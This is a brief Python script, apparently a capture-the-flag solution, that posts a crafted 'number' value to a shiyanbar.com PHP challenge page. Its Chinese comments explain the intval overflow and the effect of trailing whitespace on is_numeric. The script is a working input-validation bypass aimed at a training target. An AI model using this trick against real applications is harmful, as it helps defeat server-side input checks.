import requests

target = 'http://ctf5.shiyanbar.com/web/PHP/index.php'

r = requests.post(target, data={'number': '0e-0 '})  # -0.0 2147483647
print(r.content.decode())

# - intval函数存在溢出，32位系统上 intval(1111111111111) = 2147483647
# - is_numeric的结果受空字符影响，is_numeric('33 ') = false
